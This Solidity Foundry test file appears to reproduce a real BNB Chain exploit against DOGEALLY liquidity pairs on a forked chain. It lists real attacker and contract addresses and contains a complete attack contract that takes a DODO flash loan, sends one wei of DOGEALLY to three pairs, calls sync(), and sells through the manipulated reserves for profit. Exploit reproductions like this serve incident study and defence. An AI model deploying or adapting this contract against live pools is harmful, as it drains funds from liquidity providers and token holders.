// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 990.33 USD
// Attacker : 0xd9a34Af0b97f13871287c317Ea0e1E8C00BE0630
// Attack Contract : 0xB76fE86265B738616FD69D4751CaDa35B0A466F0
// Vulnerable Contract : 0x04Df78093e2B66a0387F8C052C8D344D84CA49af
// Attack Tx : https://bscscan.com/tx/0xcf2b8c46e5f6f761a716619800de6754058921cbde0cd5ff12cd2ce4ea6a818d
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x04df78093e2b66a0387f8c052c8d344d84ca49af#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1215
//
// Attack summary: The attacker flash-borrowed WBNB, bought DOGEALLY, transferred one wei of
// DOGEALLY into three DOGEALLY LPs, and called sync() on each pair before selling DOGEALLY
// through those manipulated reserves for WBNB and BUSD.
// Root cause: The DOGEALLY LP reserves could be forcibly desynchronized by direct token
// transfers followed by permissionless sync(), allowing swaps against reserves with one wei
// of DOGEALLY and large paired-token balances.

address constant ATTACKER = 0xd9A34AF0b97f13871287C317ea0e1E8C00BE0630;
address constant TRACE_ATTACK_CONTRACT = 0xb76Fe86265b738616fd69d4751CADA35b0a466f0;
address constant TRACE_HELPER = 0xb5D2008b13b3f44ED803dFc047bFE25EFbE62c7C;
address constant DODO_DPP = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant SECONDARY_ROUTER = 0xcF0feBd3f17CEf5b47b0cD257aCf6025c5BFf3b7;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant BUSD_TOKEN = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
address constant CAKE_TOKEN = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;
address constant DOGEALLY_TOKEN = 0x05822195B28613b0F8A484313d3bE7B357C53A4a;
address constant DOGEALLY_IMPL = 0xf2765a5ddCc935BdEB933FD85ddB8d873ca6FAA8;
address constant CAKE_WBNB_PAIR = 0x0eD7e52944161450477ee417DE9Cd3a859b14fD0;
address constant DOGEALLY_CAKE_PAIR = 0x52F5aA2dEF4e241c3896F5FeF95b16878893Bf8f;
address constant DOGEALLY_WBNB_PAIR = 0x04Df78093e2b66A0387F8c052C8d344D84ca49aF;
address constant DOGEALLY_BUSD_PAIR = 0x96D600d9dDAd3f3A28649467289b30aec29C620D;
address constant DOGEALLY_WBNB_PAIR_2 = 0xbe373a3d191adB0F70d76f8Fa040312207ce89b0;
address constant BUSD_WBNB_PAIR = 0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16;
uint256 constant FLASH_WBNB_AMOUNT = 0.01 ether;

interface IDODOFlashLoan {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface ISyncPair {
    function sync() external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

contract ContractTest is BaseTestWithBalanceLog {
    address private profitReceiver;

    function setUp() public {
        uint256 forkBlock = 50_638_349;
        vm.createSelectFork("bsc", forkBlock);

        profitReceiver = makeAddr("profitReceiver");
        fundingToken = WBNB_TOKEN;
        attacker = profitReceiver;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(TRACE_ATTACK_CONTRACT, "Trace Attack Contract");
        vm.label(TRACE_HELPER, "Trace Helper");
        vm.label(DODO_DPP, "DODO DPP WBNB/USDT Pool");
        vm.label(PANCAKE_ROUTER, "Pancake Router");
        vm.label(SECONDARY_ROUTER, "Secondary Router");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(BUSD_TOKEN, "BUSD");
        vm.label(CAKE_TOKEN, "CAKE");
        vm.label(DOGEALLY_TOKEN, "DOGEALLY");
        vm.label(DOGEALLY_IMPL, "DOGEALLY Implementation");
        vm.label(CAKE_WBNB_PAIR, "CAKE/WBNB Pair");
        vm.label(DOGEALLY_CAKE_PAIR, "DOGEALLY/CAKE Pair");
        vm.label(DOGEALLY_WBNB_PAIR, "DOGEALLY/WBNB Pair");
        vm.label(DOGEALLY_BUSD_PAIR, "DOGEALLY/BUSD Pair");
        vm.label(DOGEALLY_WBNB_PAIR_2, "DOGEALLY/WBNB Pair 2");
        vm.label(BUSD_WBNB_PAIR, "BUSD/WBNB Pair");
    }

    function testExploit() public balanceLog {
        _assertPairLayout();

        uint256 wbnbBefore = IERC20(WBNB_TOKEN).balanceOf(profitReceiver);

        DogeAllianceSyncAttack attack = new DogeAllianceSyncAttack(profitReceiver);
        attack.execute();

        uint256 profit = IERC20(WBNB_TOKEN).balanceOf(profitReceiver) - wbnbBefore;
        assertGt(profit, 1 ether);
        assertLt(profit, 2 ether);
    }

    function _assertPairLayout() private {
        assertEq(ISyncPair(CAKE_WBNB_PAIR).token0(), CAKE_TOKEN);
        assertEq(ISyncPair(CAKE_WBNB_PAIR).token1(), WBNB_TOKEN);
        assertEq(ISyncPair(DOGEALLY_CAKE_PAIR).token0(), DOGEALLY_TOKEN);
        assertEq(ISyncPair(DOGEALLY_CAKE_PAIR).token1(), CAKE_TOKEN);
        assertEq(ISyncPair(DOGEALLY_WBNB_PAIR).token0(), DOGEALLY_TOKEN);
        assertEq(ISyncPair(DOGEALLY_WBNB_PAIR).token1(), WBNB_TOKEN);
        assertEq(ISyncPair(DOGEALLY_BUSD_PAIR).token0(), DOGEALLY_TOKEN);
        assertEq(ISyncPair(DOGEALLY_BUSD_PAIR).token1(), BUSD_TOKEN);
        assertEq(ISyncPair(DOGEALLY_WBNB_PAIR_2).token0(), DOGEALLY_TOKEN);
        assertEq(ISyncPair(DOGEALLY_WBNB_PAIR_2).token1(), WBNB_TOKEN);
        assertEq(ISyncPair(BUSD_WBNB_PAIR).token0(), WBNB_TOKEN);
        assertEq(ISyncPair(BUSD_WBNB_PAIR).token1(), BUSD_TOKEN);
    }
}

contract DogeAllianceSyncAttack {
    address private immutable profitReceiver;

    constructor(
        address _profitReceiver
    ) {
        profitReceiver = _profitReceiver;
    }

    function execute() external {
        IDODOFlashLoan(DODO_DPP).flashLoan(FLASH_WBNB_AMOUNT, 0, address(this), abi.encode(profitReceiver));
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        require(msg.sender == DODO_DPP, "not DODO pool");
        require(sender == address(this), "unexpected sender");
        require(baseAmount == FLASH_WBNB_AMOUNT && quoteAmount == 0, "unexpected loan");
        require(abi.decode(data, (address)) == profitReceiver, "unexpected receiver");

        _runReserveSyncExploit();

        require(IERC20(WBNB_TOKEN).transfer(DODO_DPP, FLASH_WBNB_AMOUNT), "flash repay failed");
        require(IERC20(WBNB_TOKEN).transfer(profitReceiver, IERC20(WBNB_TOKEN).balanceOf(address(this))), "profit failed");
    }

    function _runReserveSyncExploit() private {
        _swap(PANCAKE_ROUTER, WBNB_TOKEN, CAKE_TOKEN, IERC20(WBNB_TOKEN).balanceOf(address(this)));
        _swap(PANCAKE_ROUTER, CAKE_TOKEN, DOGEALLY_TOKEN, IERC20(CAKE_TOKEN).balanceOf(address(this)));

        _dustAndSync(DOGEALLY_WBNB_PAIR);
        _dustAndSync(DOGEALLY_BUSD_PAIR);
        _dustAndSync(DOGEALLY_WBNB_PAIR_2);

        uint256 dogeallyChunk = IERC20(DOGEALLY_TOKEN).balanceOf(address(this)) / 3;
        _swap(SECONDARY_ROUTER, DOGEALLY_TOKEN, WBNB_TOKEN, dogeallyChunk);
        _swap(SECONDARY_ROUTER, DOGEALLY_TOKEN, BUSD_TOKEN, dogeallyChunk);
        _swap(PANCAKE_ROUTER, DOGEALLY_TOKEN, WBNB_TOKEN, dogeallyChunk);
        _swap(PANCAKE_ROUTER, BUSD_TOKEN, WBNB_TOKEN, IERC20(BUSD_TOKEN).balanceOf(address(this)));
    }

    function _dustAndSync(
        address pair
    ) private {
        require(IERC20(DOGEALLY_TOKEN).transfer(pair, 1), "dust transfer failed");
        ISyncPair(pair).sync();
    }

    function _swap(address router, address tokenIn, address tokenOut, uint256 amountIn) private {
        require(IERC20(tokenIn).approve(router, type(uint256).max), "approve failed");

        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;

        Uni_Router_V2(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, address(this), block.timestamp
        );
    }
}
